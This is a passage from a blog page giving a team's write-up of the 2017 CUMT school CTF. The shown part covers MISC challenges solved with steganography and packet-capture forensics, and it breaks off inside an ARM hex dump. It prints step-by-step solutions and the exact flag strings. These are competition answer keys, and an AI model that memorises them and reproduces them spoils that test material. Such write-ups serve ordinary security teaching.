@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>2017-cumt校赛writeup | 吾行吾道，虽远必至</title>
+    <meta name="generator" content="VuePress 1.5.2">
+    <link rel="icon" href="/icons/favicon.ico">
+    <link rel="manifest" href="/manifest.json">
+    <link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
+    <meta name="description" content="分享zjgcjy的个人笔记、读书论文、学习知识">
+    <meta name="author" content="zjgcjy">
+    <meta name="keywords" content="blog, document, zjgcjy">
+    <meta name="theme-color" content="#3eaf7c">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="msapplication-TileImage" content="/icons/android-chrome-192x192.png">
+    <meta name="msapplication-TileColor" content="#000000">
+    <link rel="preload" href="/assets/css/0.styles.d4ca98c4.css" as="style"><link rel="preload" href="/assets/js/app.b32307b1.js" as="script"><link rel="preload" href="/assets/js/4.1982f64f.js" as="script"><link rel="preload" href="/assets/js/1.88520771.js" as="script"><link rel="preload" href="/assets/js/143.2ab1b291.js" as="script"><link rel="preload" href="/assets/js/33.5eacd5c8.js" as="script"><link rel="prefetch" href="/assets/js/10.87870a66.js"><link rel="prefetch" href="/assets/js/100.4f9195bc.js"><link rel="prefetch" href="/assets/js/101.e3928cef.js"><link rel="prefetch" href="/assets/js/102.f6a16c4a.js"><link rel="prefetch" href="/assets/js/103.cb9eeb3b.js"><link rel="prefetch" href="/assets/js/104.89c4fe54.js"><link rel="prefetch" href="/assets/js/105.018d6cdf.js"><link rel="prefetch" href="/assets/js/106.644b36c4.js"><link rel="prefetch" href="/assets/js/107.ab12619c.js"><link rel="prefetch" href="/assets/js/108.a17bb8fe.js"><link rel="prefetch" href="/assets/js/109.c1aec76e.js"><link rel="prefetch" href="/assets/js/11.6d8986bc.js"><link rel="prefetch" href="/assets/js/110.63234584.js"><link rel="prefetch" href="/assets/js/111.0805807f.js"><link rel="prefetch" href="/assets/js/112.4ed677d6.js"><link rel="prefetch" href="/assets/js/113.88d32c96.js"><link rel="prefetch" href="/assets/js/114.7a3801dd.js"><link rel="prefetch" href="/assets/js/115.1199166c.js"><link rel="prefetch" href="/assets/js/116.7a47c01a.js"><link rel="prefetch" href="/assets/js/117.cb3ba44a.js"><link rel="prefetch" href="/assets/js/118.63128efa.js"><link rel="prefetch" href="/assets/js/119.a231ad6e.js"><link rel="prefetch" href="/assets/js/12.17970c12.js"><link rel="prefetch" href="/assets/js/120.f6b845a7.js"><link rel="prefetch" href="/assets/js/121.1c520ce3.js"><link rel="prefetch" href="/assets/js/122.d09dd219.js"><link rel="prefetch" href="/assets/js/123.d1d7f332.js"><link rel="prefetch" href="/assets/js/124.a32d1675.js"><link rel="prefetch" href="/assets/js/125.7b0202ff.js"><link rel="prefetch" href="/assets/js/126.1fc226cb.js"><link rel="prefetch" href="/assets/js/127.47224706.js"><link rel="prefetch" href="/assets/js/128.a958d443.js"><link rel="prefetch" href="/assets/js/129.7452494b.js"><link rel="prefetch" href="/assets/js/13.e956aeec.js"><link rel="prefetch" href="/assets/js/130.856d2d48.js"><link rel="prefetch" href="/assets/js/131.95dd5724.js"><link rel="prefetch" href="/assets/js/132.b54a4e40.js"><link rel="prefetch" href="/assets/js/133.8bd411a8.js"><link rel="prefetch" href="/assets/js/134.b59b03f3.js"><link rel="prefetch" href="/assets/js/135.affb5ac4.js"><link rel="prefetch" href="/assets/js/136.025de99f.js"><link rel="prefetch" href="/assets/js/137.c65df109.js"><link rel="prefetch" href="/assets/js/138.502d8473.js"><link rel="prefetch" href="/assets/js/139.ce7b6e58.js"><link rel="prefetch" href="/assets/js/14.65734390.js"><link rel="prefetch" href="/assets/js/140.5cb1be6d.js"><link rel="prefetch" href="/assets/js/141.4a938afa.js"><link rel="prefetch" href="/assets/js/142.bb3e7dce.js"><link rel="prefetch" href="/assets/js/144.2e50d220.js"><link rel="prefetch" href="/assets/js/145.0b3fedab.js"><link rel="prefetch" href="/assets/js/15.d16bc596.js"><link rel="prefetch" href="/assets/js/16.2f11d145.js"><link rel="prefetch" href="/assets/js/17.c7bf64dc.js"><link rel="prefetch" href="/assets/js/18.83fbc6e8.js"><link rel="prefetch" href="/assets/js/19.803e1c6a.js"><link rel="prefetch" href="/assets/js/20.593b893a.js"><link rel="prefetch" href="/assets/js/21.3d706923.js"><link rel="prefetch" href="/assets/js/22.80bb6e2e.js"><link rel="prefetch" href="/assets/js/23.38610372.js"><link rel="prefetch" href="/assets/js/24.18197e72.js"><link rel="prefetch" href="/assets/js/25.0ecdca93.js"><link rel="prefetch" href="/assets/js/26.79c17a3e.js"><link rel="prefetch" href="/assets/js/27.aae7c43d.js"><link rel="prefetch" href="/assets/js/28.6b821b50.js"><link rel="prefetch" href="/assets/js/29.bc60fa6c.js"><link rel="prefetch" href="/assets/js/30.a4700960.js"><link rel="prefetch" href="/assets/js/31.dd45a26e.js"><link rel="prefetch" href="/assets/js/32.f213abbb.js"><link rel="prefetch" href="/assets/js/34.9df2c850.js"><link rel="prefetch" href="/assets/js/35.5051188e.js"><link rel="prefetch" href="/assets/js/36.f549fb68.js"><link rel="prefetch" href="/assets/js/37.2930ceda.js"><link rel="prefetch" href="/assets/js/38.fa3fc6ea.js"><link rel="prefetch" href="/assets/js/39.57a76242.js"><link rel="prefetch" href="/assets/js/40.09519d07.js"><link rel="prefetch" href="/assets/js/41.74086be3.js"><link rel="prefetch" href="/assets/js/42.65ef8c95.js"><link rel="prefetch" href="/assets/js/43.9911c1f3.js"><link rel="prefetch" href="/assets/js/44.ac010ea3.js"><link rel="prefetch" href="/assets/js/45.682b7cc5.js"><link rel="prefetch" href="/assets/js/46.96c22e32.js"><link rel="prefetch" href="/assets/js/47.ec148499.js"><link rel="prefetch" href="/assets/js/48.aac0e245.js"><link rel="prefetch" href="/assets/js/49.0b57b162.js"><link rel="prefetch" href="/assets/js/5.d14ca850.js"><link rel="prefetch" href="/assets/js/50.3c897d0e.js"><link rel="prefetch" href="/assets/js/51.f77d7952.js"><link rel="prefetch" href="/assets/js/52.607eb26f.js"><link rel="prefetch" href="/assets/js/53.251c3404.js"><link rel="prefetch" href="/assets/js/54.63f76ac5.js"><link rel="prefetch" href="/assets/js/55.03566e7d.js"><link rel="prefetch" href="/assets/js/56.9efb6c9a.js"><link rel="prefetch" href="/assets/js/57.3bef7cad.js"><link rel="prefetch" href="/assets/js/58.6a5ad6c7.js"><link rel="prefetch" href="/assets/js/59.0b80c73f.js"><link rel="prefetch" href="/assets/js/6.a4ec3c32.js"><link rel="prefetch" href="/assets/js/60.fa9ed5a1.js"><link rel="prefetch" href="/assets/js/61.efb2356b.js"><link rel="prefetch" href="/assets/js/62.f65af124.js"><link rel="prefetch" href="/assets/js/63.a159e092.js"><link rel="prefetch" href="/assets/js/64.291bafcf.js"><link rel="prefetch" href="/assets/js/65.4b34810b.js"><link rel="prefetch" href="/assets/js/66.e22629cc.js"><link rel="prefetch" href="/assets/js/67.81e21dd8.js"><link rel="prefetch" href="/assets/js/68.a822b77b.js"><link rel="prefetch" href="/assets/js/69.e8a36d0d.js"><link rel="prefetch" href="/assets/js/7.6e095c06.js"><link rel="prefetch" href="/assets/js/70.c717e621.js"><link rel="prefetch" href="/assets/js/71.e16ce2c1.js"><link rel="prefetch" href="/assets/js/72.ac06a2f7.js"><link rel="prefetch" href="/assets/js/73.ffa0f28a.js"><link rel="prefetch" href="/assets/js/74.a4890fd5.js"><link rel="prefetch" href="/assets/js/75.35459948.js"><link rel="prefetch" href="/assets/js/76.3ba97919.js"><link rel="prefetch" href="/assets/js/77.a2a12e30.js"><link rel="prefetch" href="/assets/js/78.eedc8467.js"><link rel="prefetch" href="/assets/js/79.199a812b.js"><link rel="prefetch" href="/assets/js/8.1bd2aa6f.js"><link rel="prefetch" href="/assets/js/80.a27c2d7d.js"><link rel="prefetch" href="/assets/js/81.c4039a9e.js"><link rel="prefetch" href="/assets/js/82.76ae49b3.js"><link rel="prefetch" href="/assets/js/83.8360535a.js"><link rel="prefetch" href="/assets/js/84.ccc9152a.js"><link rel="prefetch" href="/assets/js/85.07ef261e.js"><link rel="prefetch" href="/assets/js/86.cd361ce6.js"><link rel="prefetch" href="/assets/js/87.eaecdcac.js"><link rel="prefetch" href="/assets/js/88.c0e2ab6e.js"><link rel="prefetch" href="/assets/js/89.4064a133.js"><link rel="prefetch" href="/assets/js/9.b0088fce.js"><link rel="prefetch" href="/assets/js/90.0c9cccd1.js"><link rel="prefetch" href="/assets/js/91.5a6fd51a.js"><link rel="prefetch" href="/assets/js/92.926f39c0.js"><link rel="prefetch" href="/assets/js/93.2ac8304c.js"><link rel="prefetch" href="/assets/js/94.8650c890.js"><link rel="prefetch" href="/assets/js/95.db71ac07.js"><link rel="prefetch" href="/assets/js/96.ecd277ce.js"><link rel="prefetch" href="/assets/js/97.8d3dd312.js"><link rel="prefetch" href="/assets/js/98.df02bf22.js"><link rel="prefetch" href="/assets/js/99.802d11d2.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.5537762e.js">
+    <link rel="stylesheet" href="/assets/css/0.styles.d4ca98c4.css">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container" data-v-dad8a512><div data-v-dad8a512><div id="loader-wrapper" class="loading-wrapper" data-v-d48f4d20 data-v-dad8a512 data-v-dad8a512><div class="loader-main" data-v-d48f4d20><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div></div> <!----> <!----></div> <div class="password-shadow password-wrapper-out" style="display:none;" data-v-64685f0e data-v-dad8a512 data-v-dad8a512><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e>吾行吾道，虽远必至</h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>zjgcjy</span>
+            
+          <span data-v-64685f0e>2017 - </span>
+          2020
+        </a></span></div></div> <div class="hide" data-v-dad8a512><header class="navbar" data-v-dad8a512><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/icons/nav-logo.png" alt="吾行吾道，虽远必至" class="logo"> <span class="site-name">吾行吾道，虽远必至</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <form id="search-form" role="search" class="algolia-search-wrapper search-box"><i class="iconfont reco-search"></i> <input id="algolia-search-input" class="search-query"></form> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-document"></i>
+      文档
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>笔记</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/book-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  读书笔记
+</a></li><li class="dropdown-subitem"><a href="/docs/paper-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  学术论文
+</a></li></ul></li><li class="dropdown-item"><h4>文章</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/tech-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  技术文档
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      分类
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/diary/" class="nav-link"><i class="iconfont undefined"></i>
+  diary
+</a></li><li class="dropdown-item"><!----> <a href="/categories/notes/" class="nav-link"><i class="iconfont undefined"></i>
+  notes
+</a></li><li class="dropdown-item"><!----> <a href="/categories/others/" class="nav-link"><i class="iconfont undefined"></i>
+  others
+</a></li><li class="dropdown-item"><!----> <a href="/categories/project/" class="nav-link"><i class="iconfont undefined"></i>
+  project
+</a></li><li class="dropdown-item"><!----> <a href="/categories/tools/" class="nav-link"><i class="iconfont undefined"></i>
+  tools
+</a></li><li class="dropdown-item"><!----> <a href="/categories/ctf/" class="nav-link"><i class="iconfont undefined"></i>
+  ctf
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  标签
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  时光机
+</a></div><div class="nav-item"><a href="/about.html" class="nav-link"><i class="iconfont reco-account"></i>
+  关于我
+</a></div><div class="nav-item"><a href="https://github.com/zjgcjy" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  Github
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-dad8a512></div> <aside class="sidebar" data-v-dad8a512><div class="personal-info-wrapper" data-v-ca798c94 data-v-dad8a512><img src="/icons/me.jpg" alt="author-avatar" class="personal-img" data-v-ca798c94> <h3 class="name" data-v-ca798c94>
+    zjgcjy
+  </h3> <div class="num" data-v-ca798c94><div data-v-ca798c94><h3 data-v-ca798c94>112</h3> <h6 data-v-ca798c94>文章</h6></div> <div data-v-ca798c94><h3 data-v-ca798c94>49</h3> <h6 data-v-ca798c94>标签</h6></div></div> <hr data-v-ca798c94></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link"><i class="iconfont reco-home"></i>
+  主页
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-document"></i>
+      文档
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>笔记</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/book-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  读书笔记
+</a></li><li class="dropdown-subitem"><a href="/docs/paper-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  学术论文
+</a></li></ul></li><li class="dropdown-item"><h4>文章</h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/docs/tech-notes/" class="nav-link"><i class="iconfont undefined"></i>
+  技术文档
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont reco-category"></i>
+      分类
+    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/diary/" class="nav-link"><i class="iconfont undefined"></i>
+  diary
+</a></li><li class="dropdown-item"><!----> <a href="/categories/notes/" class="nav-link"><i class="iconfont undefined"></i>
+  notes
+</a></li><li class="dropdown-item"><!----> <a href="/categories/others/" class="nav-link"><i class="iconfont undefined"></i>
+  others
+</a></li><li class="dropdown-item"><!----> <a href="/categories/project/" class="nav-link"><i class="iconfont undefined"></i>
+  project
+</a></li><li class="dropdown-item"><!----> <a href="/categories/tools/" class="nav-link"><i class="iconfont undefined"></i>
+  tools
+</a></li><li class="dropdown-item"><!----> <a href="/categories/ctf/" class="nav-link"><i class="iconfont undefined"></i>
+  ctf
+</a></li></ul></div></div><div class="nav-item"><a href="/tag/" class="nav-link"><i class="iconfont reco-tag"></i>
+  标签
+</a></div><div class="nav-item"><a href="/timeline/" class="nav-link"><i class="iconfont reco-date"></i>
+  时光机
+</a></div><div class="nav-item"><a href="/about.html" class="nav-link"><i class="iconfont reco-account"></i>
+  关于我
+</a></div><div class="nav-item"><a href="https://github.com/zjgcjy" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont reco-github"></i>
+  Github
+  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav> <ul class="sidebar-links"><li><a href="/writeup/" aria-current="page" class="sidebar-link">writeup是什么</a></li><li><a href="/writeup/2017-cumtctf-final-writeup.html" aria-current="page" class="active sidebar-link">2017-cumt校赛writeup</a></li><li><a href="/writeup/2018-cumtctf-final-writeup.html" class="sidebar-link">2018校赛逆向出题思路</a></li><li><a href="/writeup/2019-04-BlueCTF-writeup.html" class="sidebar-link">2019年4月BlueCTF writeup</a></li><li><a href="/writeup/2019-05-YellowCTF-writeup.html" class="sidebar-link">2019年5月YellowCTF writeup</a></li><li><a href="/writeup/2019-anheng-writeup.html" class="sidebar-link">2019安恒月赛一月赛writeup</a></li><li><a href="/writeup/2019-ins-hacker-reverse-writeup.html" class="sidebar-link">2019INS逆向writeup</a></li></ul> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-64685f0e data-v-dad8a512><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e>2017-cumt校赛writeup</h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>zjgcjy</span>
+            
+          <span data-v-64685f0e>2017 - </span>
+          2020
+        </a></span></div></div> <div data-v-dad8a512><main class="page"><div class="page-title" style="display:none;"><h1>2017-cumt校赛writeup</h1> <hr> <div data-v-aa64b9d0><i class="iconfont reco-account" data-v-aa64b9d0><span data-v-aa64b9d0>zjgcjy</span></i> <i class="iconfont reco-date" data-v-aa64b9d0><span data-v-aa64b9d0>2018-08-18 23:01:00</span></i> <!----> <i class="iconfont reco-tag tags" data-v-aa64b9d0><span class="tag-item" data-v-aa64b9d0>writeup</span></i></div></div> <div class="theme-reco-content content__default" style="display:none;"><hr> <blockquote><p>本次比赛历时10个小时，我们队最终取得了第二名的成绩，还算不错吧。感谢3位队友的努力付出，也感谢各位学长的认真出题与提示（笑）。以下是我们队的writeup。本人才疏学浅,不周不对之处,望乞见谅。</p> <ul><li>MISC</li> <li>CRYPTO</li> <li>WEB</li> <li>MOBILE</li> <li>REVERSE</li> <li>PWN</li></ul></blockquote> <h2 id="misc"><a href="#misc" class="header-anchor">#</a> MISC</h2> <h3 id="签到题"><a href="#签到题" class="header-anchor">#</a> 签到题</h3> <h3 id="school-song"><a href="#school-song" class="header-anchor">#</a> School song</h3> <p>使用16进制文本分析器直接打开wav文件，发现文件最后部分存在异常。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token punctuation">..</span>./-/./--./<span class="token punctuation">..</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/-<span class="token punctuation">..</span>/./-<span class="token punctuation">..</span><span class="token punctuation">..</span>-/.--./.-/<span class="token punctuation">..</span>./<span class="token punctuation">..</span>./-<span class="token punctuation">..</span><span class="token punctuation">..</span>-/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>./-<span class="token punctuation">..</span><span class="token punctuation">..</span>-/<span class="token punctuation">..</span>-./.-<span class="token punctuation">..</span>/<span class="token punctuation">..</span>.-<span class="token punctuation">..</span>-/--.
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这是是一段摩斯电码，使用翻译器得到：STEGHIDE-PASS-IS-FL$G。说明wav文件采用steghide加密，密码为FL$G。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>steghide extract -sf cumt.wav
+cumtctf<span class="token punctuation">{</span>Lu0Ti@NY1_s0_Cut3<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h3 id="digital-image-processing-1"><a href="#digital-image-processing-1" class="header-anchor">#</a> Digital Image Processing 1</h3> <p>打开后，由题目意思和文件信息格式知道，这是一张图片，根据每个点的值，画出这张图片即可得到flag。在比赛中，我们认为图片格式是RGB，但是RGB只有3位，显然不对，但是使用RGB的Python脚本画图却成功了。但是图片颜色不对，只能说运气还不错吧。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#-*- coding:utf-8 -*-</span>
+<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token keyword">import</span> re
+x <span class="token operator">=</span> <span class="token number">250</span>
+y <span class="token operator">=</span> <span class="token number">250</span>
+image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">&quot;RGB&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'cumt.txt'</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        l <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> l<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;,&quot;</span><span class="token punctuation">)</span>
+        image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'image1.jpg'</span><span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>得到flag。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>cumtctf<span class="token punctuation">{</span>CMYK_ExC1t3d<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="digital-image-processing-2"><a href="#digital-image-processing-2" class="header-anchor">#</a> Digital Image Processing 2</h3> <p>这道题，题目提示是傅里叶变换，由此想到数字水印，网上苦苦寻觅，只有matlab能处理，但是队友三人都没用matlab，无奈。最后使用photoshop进行简单的处理，依稀能看到flag，剩下的一位看不清，于是开始猜，虽然最后猜对了，但是提交时比赛已经结束。。。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>cumtctf<span class="token punctuation">{</span>666_to_you<span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="hacker"><a href="#hacker" class="header-anchor">#</a> Hacker</h3> <p>本题给了个抓包文件，还有一个加密的zip。打开wireshark，追踪TCP，查看各文件头，存在一个linux下可执行文件，提取出来后找到zip密码为：int_main_bxs。解密zip后得到mini.pcap，打开继续分析，发现flag.tar.gz文件，仔细追踪TCP，在其中一个发现了该文件的文件头，恢复文件，得到flag.txt。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>cumtctf<span class="token punctuation">{</span>CaiDao_@nd_B4ckDoor_so_c00l<span class="token operator">!</span><span class="token punctuation">}</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="lsb-picture"><a href="#lsb-picture" class="header-anchor">#</a> LSB Picture</h3> <p>这个题目首先给了个mp3，但是分析知道里面有个PNG文件，提取出来之后，首先根据题目意思LSB，分析了半天，没什么用，然后放了HINT，在mp3里面，也就是PNG文件最后，发现一段代码。。。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyaW5jL2Nsb2Fja2VkLXBpeGVsKHBhc3N3b3JkOmZsYWcp
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>最后发现是Base64加密，解密后得到：</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>https://github.com/cyberinc/cloacked-pixel<span class="token punctuation">(</span>password:flag<span class="token punctuation">)</span>
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>然后去这个地址找工具。。。下载下来后。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>python lsb.py extract <span class="token number">0</span>.png-1.png flag
+</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>得到一个文件。名曰：LDR.asm。。。</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>00010554~00010674
+E52DB004 E28DB000
+E24DD01C E50B0018
+E3A03000 E50B3010
+EA000022 E3A03000
+E50B3008 E3A03000
+E50B300C EA000013
+E51B300C E51B2018
+E0823003 E5D33000
+E1A00003 E59F10C8
+E51B2010 E1A03002
+E1A03203 E0433002
+E51B200C E0833002
+E7913103 E0030390
+E51B2008 E0823003
+E50B3008 E51B300C
+E2833001 E50B300C
+E51B300C E353000E
+DAFFFFE8 E59F1084
+E51B3010 E51B2008
+E7812103 E51B3010
+E2833001 E50B3010
+E51B3010 E353000E
+DAFFFFD9 E3A03000
+E50B3010 EA00000C
+E59F2050 E51B3010
+E7922103 E59F1048
+E51B3010 E7913103
+E1520003 0A000001
+E3E03000 EA000006
+E51B3010 E2833001
+E50B3010 E51B3010
+E353000E DAFFFFEF
+E3A03000 E1A00003
+E24BD000 E49DB004
+E12FFF1E 00021034
+00021400 000213B8
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
+0002102C~0002146C
+00000000 00000000
+00000024 0000000E
+00000011 00000020
+00000008 00000006
+00000001 0000000C
+0000004C 00000055
+00000031 00000012
+00000039 00000002
+00000002 00000021
+00000010 00000010
+0000001E 00000006
+00000004 00000002
+0000000A 00000048
+00000054 0000002F
+00000013 00000039
+00000001 00000001
+0000001C 0000000F
+0000000F 0000001B
+00000006 00000004
+00000001 00000009
+00000040 0000004D
+0000002B 00000012
+00000035 00000001
+00000002 00000013
+0000000C 0000000B
+00000013 00000005
+00000001 00000001
+00000005 0000002B
+00000037 0000001C
+0000000E 00000027
+00000001 00000001
+00000019 0000000A
+0000000B 00000014
+00000006 00000004
+00000001 00000008
+00000031 00000037
+0000001E 0000000D
+00000026 00000001
+00000001 0000001A
+0000000E 0000000F
